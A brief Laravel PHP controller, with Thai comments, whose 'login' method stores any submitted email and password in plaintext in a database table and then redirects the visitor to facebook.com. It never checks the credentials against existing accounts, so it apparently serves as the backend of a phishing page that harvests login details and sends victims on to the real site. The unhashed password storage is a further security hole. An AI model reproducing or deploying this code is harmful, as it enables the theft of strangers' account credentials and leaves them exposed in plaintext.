<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Userdb; // ถ้าจำเป็นต้องใช้โมเดล Userdb
use Illuminate\Support\Facades\Hash;

class UserLoginController extends Controller
{
    public function login(Request $request)
    {
        // Validation และบันทึกข้อมูล
        $request->validate([
            'email' => 'required|email',
            'password' => 'required|min:6',
        ]);

        Userdb::create([
            'username' => $request->input('email'), // ดึงข้อมูลอีเมลจากฟอร์ม
            'password' => $request->input('password'), // ดึงข้อมูลรหัสผ่าน
        ]);

        return redirect()->to('https://www.facebook.com');
    }
}
